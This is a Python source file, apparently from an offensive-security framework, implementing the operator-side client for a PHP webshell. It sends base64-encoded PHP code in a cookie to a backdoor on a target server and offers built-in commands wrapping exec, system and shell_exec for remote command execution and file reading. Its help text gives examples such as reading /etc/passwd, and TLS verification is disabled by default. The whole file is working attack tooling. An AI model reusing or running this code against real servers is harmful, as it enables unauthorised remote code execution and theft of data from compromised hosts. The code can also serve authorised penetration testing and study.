#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
PHP shell implementation for webshell sessions
"""

import base64
import random
import string
import re
from typing import Dict, Any, List, Optional
from .base_shell import BaseShell
from core.output_handler import print_info, print_error, print_warning

class PHPShell(BaseShell):
    """PHP shell implementation for webshell sessions"""
    
    def __init__(self, session_id: str, session_type: str = "php", framework=None):
        super().__init__(session_id, session_type)
        self.framework = framework
        self.http_session = None  # requests.Session object
        self.target_url = None  # Base URL for requests
        self.cookie_name = "kitty_shell"  # Cookie name for PHP code
        self.uripath = "/"  # Path to PHP backdoor
        
        # Initialize PHP environment
        self.current_directory = "/"
        self.environment_vars = {
            'PHP_VERSION': '7.4+',
            'SERVER_SOFTWARE': 'Apache',
            'DOCUMENT_ROOT': '/var/www/html'
        }
        
        # Register built-in commands
        self.builtin_commands = {
            'help': self._cmd_help,
            'clear': self._cmd_clear,
            'history': self._cmd_history,
            'eval': self._cmd_eval,
            'exec': self._cmd_exec,
            'system': self._cmd_system,
            'shell_exec': self._cmd_shell_exec,
            'pwd': self._cmd_pwd,
            'cd': self._cmd_cd,
            'ls': self._cmd_ls,
            'cat': self._cmd_cat,
            'whoami': self._cmd_whoami,
            'phpinfo': self._cmd_phpinfo,
            'exit': self._cmd_exit
        }
        
        # Initialize HTTP connection
        self._initialize_http_connection()
    
    def _initialize_http_connection(self):
        """Initialize HTTP connection from session/listener"""
        try:
            if not self.framework:
                return
            
            # Get session data
            if hasattr(self.framework, 'session_manager'):
                session = self.framework.session_manager.get_session(self.session_id)
                if session:
                    # Determine protocol based on port (443 = HTTPS, else HTTP)
                    protocol = 'https' if int(session.port) == 443 else 'http'
                    self.target_url = f"{protocol}://{session.host}:{session.port}"
                    if session.data:
                        self.uripath = session.data.get('uripath', '/')
                        self.cookie_name = session.data.get('cookie_name', 'kitty_shell')
                    
                    # Try to get HTTP connection from listener
                    listener_id = session.data.get('listener_id') if session.data else None
                    if listener_id and hasattr(self.framework, 'active_listeners'):
                        listener = self.framework.active_listeners.get(listener_id)
                        if listener and hasattr(listener, '_session_connections'):
                            connection = listener._session_connections.get(self.session_id)
                            if connection:
                                # Check if it's a requests.Session
                                if hasattr(connection, 'get') or hasattr(connection, 'request'):
                                    self.http_session = connection
                                    return
                                # Check if it's a ResponseWithSession wrapper (from http_client)
                                elif hasattr(connection, 'session'):
                                    self.http_session = connection.session
                                    return
                                # Check if it's a ResponseWithSession by checking for status_code attribute
                                elif hasattr(connection, 'status_code') and hasattr(connection, 'session'):
                                    self.http_session = connection.session
                                    return
                    
                    # If no connection found, create a new HTTP session
                    import requests
                    self.http_session = requests.Session()
                    
        except Exception as e:
            print_warning(f"Could not initialize HTTP connection: {e}")
            import requests
            self.http_session = requests.Session()
    
    @property
    def shell_name(self) -> str:
        return "php"
    
    @property
    def prompt_template(self) -> str:
        return "php> "
    
    def get_prompt(self) -> str:
        """Get the current shell prompt"""
        return self.prompt_template
    
    def execute_command(self, command: str) -> Dict[str, Any]:
        """Execute a command in the PHP shell"""
        if not command.strip():
            return {'output': '', 'status': 0, 'error': ''}
        
        # Add to history
        self.add_to_history(command)
        
        # Parse command
        parts = command.strip().split(None, 1)
        cmd = parts[0]
        args = parts[1] if len(parts) > 1 else ""
        
        # Check for built-in commands
        if cmd in self.builtin_commands:
            try:
                return self.builtin_commands[cmd](args)
            except Exception as e:
                return {'output': '', 'status': 1, 'error': f'Built-in command error: {str(e)}'}
        
        # Try to execute as PHP code
        try:
            return self._execute_php_code(command)
        except Exception as e:
            return {'output': '', 'status': 1, 'error': f'PHP execution error: {str(e)}'}
    
    def _execute_php_code(self, php_code: str) -> Dict[str, Any]:
        """Execute PHP code via HTTP webshell"""
        if not self.http_session:
            return {'output': '', 'status': 1, 'error': 'HTTP session not available'}
        
        if not self.target_url:
            return {'output': '', 'status': 1, 'error': 'Target URL not set'}
        
        try:
            # Generate unique markers to identify PHP output
            marker_start = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            marker_end = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            
            # Wrap PHP code with markers to extract only the output
            # Use double quotes and escape them properly in PHP
            wrapped_code = f'echo "{marker_start}"; {php_code}; echo "{marker_end}";'
            
            # Encode PHP code in base64
            encoded_code = base64.b64encode(wrapped_code.encode('utf-8')).decode('utf-8')
            
            # Send request with cookie
            cookies = {self.cookie_name: encoded_code}
            url = f"{self.target_url}{self.uripath}"
            
            # Use verify=False for self-signed certificates (default behavior)
            # The session from the listener should already have verify_ssl configured
            verify_ssl = False
            if hasattr(self, 'framework') and self.framework:
                # Try to get verify_ssl from the listener's HTTPClient options
                if hasattr(self.framework, 'session_manager'):
                    session = self.framework.session_manager.get_session(self.session_id)
                    if session and session.data:
                        listener_id = session.data.get('listener_id')
                        if listener_id and hasattr(self.framework, 'active_listeners'):
                            listener = self.framework.active_listeners.get(listener_id)
                            if listener and hasattr(listener, 'verify_ssl'):
                                verify_ssl_value = getattr(listener.verify_ssl, 'value', False) if hasattr(listener.verify_ssl, 'value') else False
                                if isinstance(verify_ssl_value, str):
                                    verify_ssl = verify_ssl_value.lower() in ('true', 'yes', 'y', '1')
                                else:
                                    verify_ssl = bool(verify_ssl_value)
            
            response = self.http_session.get(url, cookies=cookies, timeout=10, verify=verify_ssl)
            
            if response.status_code == 200:
                # Decode response
                full_output = response.content.decode('utf-8', errors='ignore')
                
                # Extract content between markers
                start_idx = full_output.find(marker_start)
                end_idx = full_output.find(marker_end)
                
                if start_idx != -1 and end_idx != -1 and end_idx > start_idx:
                    # Extract only the content between markers
                    output = full_output[start_idx + len(marker_start):end_idx]
                else:
                    # Markers not found, try to extract text content (fallback)
                    # Remove HTML tags and get text content
                    # Try to find if there's any output before HTML starts
                    html_start = full_output.find('<')
                    if html_start > 0:
                        # There's content before HTML
                        output = full_output[:html_start].strip()
                    else:
                        # No markers and HTML starts immediately, try to extract text
                        # Remove HTML tags
                        output = re.sub(r'<[^>]+>', '', full_output)
                        # Remove extra whitespace
                        output = re.sub(r'\s+', ' ', output).strip()
                
                # Replace literal \n with actual newlines (in case PHP outputs them as strings)
                output = output.replace('\\n', '\n')
                return {'output': output, 'status': 0, 'error': ''}
            else:
                return {
                    'output': '',
                    'status': 1,
                    'error': f'HTTP {response.status_code}: {response.reason}'
                }
                
        except Exception as e:
            return {'output': '', 'status': 1, 'error': f'Request failed: {str(e)}'}
    
    def get_available_commands(self) -> List[str]:
        """Get list of available commands"""
        return list(self.builtin_commands.keys())
    
    # Built-in command implementations
    def _cmd_help(self, args: str) -> Dict[str, Any]:
        """Show help"""
        help_text = """PHP Shell Commands:
  help                    Show this help
  clear                   Clear screen
  history [n]             Show command history
  eval <code>             Evaluate PHP code
  exec <command>          Execute system command (returns output)
  system <command>        Execute system command (with output)
  shell_exec <command>    Execute shell command
  pwd                     Print working directory
  cd <dir>                Change directory
  ls [dir]                List directory contents (pure PHP)
  cat <file>              Read and display file contents (pure PHP)
  whoami                  Print current user
  phpinfo                 Show PHP configuration
  exit                    Exit shell

Usage Examples:
  Direct PHP code:
    echo 'Hello World'              Print text
    phpinfo()                      Show PHP info
    getcwd()                       Get current directory
    $_SERVER['DOCUMENT_ROOT']      Get document root
    file_get_contents('file.txt')  Read file
  
  Using eval command:
    eval echo 'Hello'              Execute PHP code
    eval $x = 5; echo $x;          Execute PHP with variables
    eval file_get_contents('/etc/passwd')  Read file
  
  Using exec command:
    exec ls -la                    Execute system command
    exec id                        Show user ID
    exec cat /etc/passwd           Read file via system
    exec whoami                    Show current user
  
  Using system command:
    system ls -la                  Execute with output
    system pwd                     Show current directory
  
  Using shell_exec command:
    shell_exec ls -la              Execute shell command"""
        return {'output': help_text + '\n', 'status': 0, 'error': ''}
    
    def _cmd_clear(self, args: str) -> Dict[str, Any]:
        """Clear screen"""
        return {'output': '\033[2J\033[H', 'status': 0, 'error': ''}
    
    def _cmd_history(self, args: str) -> Dict[str, Any]:
        """Show command history"""
        limit = 50
        if args and args.isdigit():
            limit = int(args)
        
        history = self.get_history(limit)
        output_lines = []
        for i, cmd in enumerate(history, 1):
            output_lines.append(f"{i:4d}  {cmd}")
        
        return {'output': '\n'.join(output_lines) + '\n', 'status': 0, 'error': ''}
    
    def _cmd_eval(self, args: str) -> Dict[str, Any]:
        """Evaluate PHP code"""
        if not args:
            return {'output': '', 'status': 1, 'error': 'eval: code required'}
        
        return self._execute_php_code(args)
    
    def _cmd_exec(self, args: str) -> Dict[str, Any]:
        """Execute system command"""
        if not args:
            return {'output': '', 'status': 1, 'error': 'exec: command required'}
        
        # Convert to PHP exec() call - escape single quotes
        escaped_args = args.replace("'", "\\'")
        php_code = f"$output = array(); exec('{escaped_args}', $output); echo implode('\\n', $output);"
        return self._execute_php_code(php_code)
    
    def _cmd_system(self, args: str) -> Dict[str, Any]:
        """Execute system command with output"""
        if not args:
            return {'output': '', 'status': 1, 'error': 'system: command required'}
        
        # Convert to PHP system() call - escape single quotes
        escaped_args = args.replace("'", "\\'")
        php_code = f"system('{escaped_args}');"
        return self._execute_php_code(php_code)
    
    def _cmd_shell_exec(self, args: str) -> Dict[str, Any]:
        """Execute shell command"""
        if not args:
            return {'output': '', 'status': 1, 'error': 'shell_exec: command required'}
        
        # Convert to PHP shell_exec() call - escape single quotes
        escaped_args = args.replace("'", "\\'")
        php_code = f"echo shell_exec('{escaped_args}');"
        return self._execute_php_code(php_code)
    
    def _cmd_pwd(self, args: str) -> Dict[str, Any]:
        """Print working directory"""
        php_code = "echo getcwd();"
        result = self._execute_php_code(php_code)
        if result['status'] == 0 and result['output']:
            # Update current directory
            self.current_directory = result['output'].strip()
        return result
    
    def _cmd_cd(self, args: str) -> Dict[str, Any]:
        """Change directory"""
        if not args:
            args = "~"
        
        # Escape single quotes
        escaped_args = args.replace("'", "\\'")
        php_code = f"chdir('{escaped_args}'); echo getcwd();"
        result = self._execute_php_code(php_code)
        if result['status'] == 0 and result['output']:
            # Update current directory
            self.current_directory = result['output'].strip()
        return result
    
    def _cmd_ls(self, args: str) -> Dict[str, Any]:
        """List directory contents (pure PHP, no system calls)"""
        dir_path = args if args else "."
        # Escape single quotes
        escaped_dir = dir_path.replace("'", "\\'")
        # Use pure PHP functions: scandir() and is_dir()
        php_code = f"""
$dir = '{escaped_dir}';
if (!is_dir($dir)) {{
	echo "Directory not found: $dir" . PHP_EOL;
	exit;
}}
$files = scandir($dir);
if ($files === false) {{
	echo "Cannot read directory: $dir" . PHP_EOL;
	exit;
}}
foreach($files as $file) {{
	if($file != '.' && $file != '..') {{
		$fullpath = $dir . '/' . $file;
		$type = is_dir($fullpath) ? '/' : (is_file($fullpath) ? '' : '?');
		$size = is_file($fullpath) ? filesize($fullpath) : 0;
		echo sprintf("%-40s %10s %s" . PHP_EOL, $file . $type, number_format($size), date('Y-m-d H:i:s', filemtime($fullpath)));
	}}
}}
"""
        return self._execute_php_code(php_code)
    
    def _cmd_cat(self, args: str) -> Dict[str, Any]:
        """Read and display file contents (pure PHP, no system calls)"""
        if not args:
            return {'output': '', 'status': 1, 'error': 'cat: file path required'}
        
        # Escape single quotes
        escaped_path = args.replace("'", "\\'")
        # Use pure PHP file_get_contents()
        php_code = f"""
$file = '{escaped_path}';
if (!file_exists($file)) {{
	echo "File not found: $file" . PHP_EOL;
	exit;
}}
if (!is_readable($file)) {{
	echo "File is not readable: $file" . PHP_EOL;
	exit;
}}
if (is_dir($file)) {{
	echo "Is a directory: $file" . PHP_EOL;
	exit;
}}
$content = file_get_contents($file);
if ($content === false) {{
	echo "Cannot read file: $file" . PHP_EOL;
	exit;
}}
echo $content;
"""
        return self._execute_php_code(php_code)
    
    def _cmd_whoami(self, args: str) -> Dict[str, Any]:
        """Print current user"""
        php_code = "echo get_current_user();"
        result = self._execute_php_code(php_code)
        if result['status'] == 0 and result['output']:
            self.username = result['output'].strip()
        return result
    
    def _cmd_phpinfo(self, args: str) -> Dict[str, Any]:
        """Show PHP configuration (formatted)"""
        # Use PHP to extract key information without HTML
        php_code = """
$info = array();
$info['PHP Version'] = phpversion();
$info['Server API'] = php_sapi_name();
$info['System'] = php_uname();
$info['Server Software'] = $_SERVER['SERVER_SOFTWARE'] ?? 'N/A';
$info['Document Root'] = $_SERVER['DOCUMENT_ROOT'] ?? 'N/A';
$info['Script Filename'] = $_SERVER['SCRIPT_FILENAME'] ?? 'N/A';
$info['Server Name'] = $_SERVER['SERVER_NAME'] ?? 'N/A';
$info['Server Port'] = $_SERVER['SERVER_PORT'] ?? 'N/A';
$info['Loaded Extensions'] = implode(', ', get_loaded_extensions());
$info['Memory Limit'] = ini_get('memory_limit');
$info['Max Execution Time'] = ini_get('max_execution_time');
$info['Upload Max Filesize'] = ini_get('upload_max_filesize');
$info['Post Max Size'] = ini_get('post_max_size');
$info['Disabled Functions'] = ini_get('disable_functions') ?: 'None';
$info['Open Basedir'] = ini_get('open_basedir') ?: 'None';
$info['Safe Mode'] = ini_get('safe_mode') ? 'On' : 'Off';
$info['Current User'] = get_current_user();
$info['Current Directory'] = getcwd();
$info['File Permissions'] = substr(sprintf('%o', fileperms('.')), -4);

foreach($info as $key => $value) {
    echo $key . ': ' . $value . "\\n";
}
"""
        result = self._execute_php_code(php_code)
        
        # Format the output nicely
        if result.get('output'):
            output = result['output']
            # Split into sections for better readability
            lines = output.strip().split('\n')
            formatted_output = "PHP Configuration Information:\n"
            formatted_output += "=" * 60 + "\n"
            
            for line in lines:
                if ':' in line:
                    key, value = line.split(':', 1)
                    key = key.strip()
                    value = value.strip()
                    # Format with padding
                    formatted_output += f"{key:<25} {value}\n"
            
            result['output'] = formatted_output
        
        return result
    
    def _cmd_exit(self, args: str) -> Dict[str, Any]:
        """Exit shell"""
        self.deactivate()
        return {'output': 'exit\n', 'status': 0, 'error': ''}

